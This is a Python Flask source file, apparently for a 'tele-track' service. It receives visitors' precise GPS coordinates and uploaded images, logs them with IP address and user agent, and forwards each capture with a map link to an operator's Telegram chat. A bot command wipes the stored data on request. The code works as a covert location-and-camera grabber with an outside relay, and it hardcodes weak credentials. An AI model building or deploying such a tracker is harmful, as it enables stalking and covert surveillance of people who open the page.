from flask import Flask, request, jsonify, send_file
from flask_httpauth import HTTPBasicAuth
import sqlite3
from datetime import datetime
import os
import traceback
import requests
from telegram import Bot, Update
from telegram.ext import Application, CommandHandler, ContextTypes
import asyncio

# -------------------- Flask Setup --------------------
app = Flask(__name__)
auth = HTTPBasicAuth()
users = {"admin": "pass123"}

@auth.verify_password
def verify_password(username, password):
    return username if username in users and users[username] == password else None

# -------------------- Folder Setup --------------------
SAVE_FOLDER = "saved_files"
os.makedirs(SAVE_FOLDER, exist_ok=True)

# -------------------- Database Setup --------------------
def init_db():
    conn = sqlite3.connect('osint_data.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS osint_data
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  type TEXT,
                  latitude REAL,
                  longitude REAL,
                  accuracy REAL,
                  timestamp TEXT,
                  ip_address TEXT,
                  user_agent TEXT,
                  file_path TEXT)''')
    conn.commit()
    conn.close()

init_db()

# -------------------- Telegram Bot Setup --------------------
TELEGRAM_BOT_TOKEN = os.environ.get("BOT_TOKEN")  # use a key like BOT_TOKEN
AUTHORIZED_KEY = os.environ.get("AUTH_KEY", "ztrack577802")  # optional

authenticated_users = set()

bot = Bot(token=TELEGRAM_BOT_TOKEN)
application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

# -------------------- Telegram Handlers --------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in authenticated_users:
        await update.message.reply_text("🔒 Please authenticate using /auth <key>")
        return
    await update.message.reply_text("✅ Server is live!")

async def auth(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /auth <key>")
        return
    if context.args[0] == AUTHORIZED_KEY:
        authenticated_users.add(user_id)
        await update.message.reply_text("🔑 Authenticated successfully!")
    else:
        await update.message.reply_text("❌ Invalid key!")

async def chatid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"🆔 Your chat ID: {update.effective_user.id}")

async def delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in authenticated_users:
        await update.message.reply_text("🔒 You are not authenticated.")
        return

    deleted_files = 0
    for file in os.listdir(SAVE_FOLDER):
        file_path = os.path.join(SAVE_FOLDER, file)
        if os.path.isfile(file_path):
            os.remove(file_path)
            deleted_files += 1

    conn = sqlite3.connect('osint_data.db')
    c = conn.cursor()
    c.execute("DELETE FROM osint_data")
    conn.commit()
    conn.close()

    await update.message.reply_text(f"🗑️ Deleted {deleted_files} image(s) and cleared database.")

# Register handlers
application.add_handler(CommandHandler("start", start))
application.add_handler(CommandHandler("auth", auth))
application.add_handler(CommandHandler("chatid", chatid))
application.add_handler(CommandHandler("delete", delete))

# -------------------- Telegram Message Utilities --------------------
def send_telegram_message(message):
    for user_id in authenticated_users:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", data={
            "chat_id": user_id,
            "text": message,
            "parse_mode": "Markdown"
        })

def send_telegram_image(image_path, caption=""):
    for user_id in authenticated_users:
        with open(image_path, "rb") as photo:
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto", data={
                "chat_id": user_id,
                "caption": caption
            }, files={"photo": photo})

# -------------------- Flask Routes --------------------
@app.route('/')
def index():
    return send_file('static/index.html')

@app.route('/location', methods=['POST'])
def receive_location():
    data = request.get_json()
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    conn = sqlite3.connect('osint_data.db')
    c = conn.cursor()
    c.execute("""INSERT INTO osint_data
                 (type, latitude, longitude, accuracy, timestamp, ip_address, user_agent)
                 VALUES (?, ?, ?, ?, ?, ?, ?)""",
              ("location", data['latitude'], data['longitude'], data['accuracy'],
               datetime.utcnow().isoformat(), ip_address, user_agent))
    conn.commit()
    conn.close()

    msg = (
        "📍 *New Location Received:*\n"
        f"Latitude: `{data['latitude']}`\n"
        f"Longitude: `{data['longitude']}`\n"
        f"Accuracy: ±{data['accuracy']} m\n"
        f"[📍 View on Map](https://www.google.com/maps?q={data['latitude']},{data['longitude']})\n"
        f"IP: `{ip_address}`\n"
        f"UA: `{user_agent}`"
    )
    send_telegram_message(msg)

    return jsonify({"status": "OK"}), 200

@app.route('/upload_image', methods=['POST'])
def upload_image():
    if 'image' not in request.files:
        return jsonify({"error": "No image uploaded"}), 400

    image_file = request.files['image']
    timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(SAVE_FOLDER, f"image_{timestamp}.jpg")
    image_file.save(filename)

    conn = sqlite3.connect('osint_data.db')
    c = conn.cursor()
    c.execute("""INSERT INTO osint_data (type, file_path, timestamp)
                 VALUES (?, ?, ?)""",
              ("image", filename, datetime.utcnow().isoformat()))
    conn.commit()
    conn.close()

    send_telegram_image(filename, caption="🖼️ New Image Uploaded")

    return jsonify({"status": "OK"}), 200

# -------------------- Telegram Webhook Route --------------------
@app.route('/webhook', methods=['POST'])
def telegram_webhook():
    if request.method == "POST":
        update = Update.de_json(request.get_json(force=True), bot)
        
        async def process():
            await application.initialize()  # <== REQUIRED!
            await application.process_update(update)

        asyncio.run(process())

        return "OK", 200
    print(f"Received update: {update}")

# -------------------- Set Webhook Manually --------------------
@app.route('/set_webhook')
def set_webhook():
    webhook_url = "https://tele-track-7lt7.onrender.com/webhook"
    result = bot.set_webhook(webhook_url)
    return f"Webhook set: {result}"

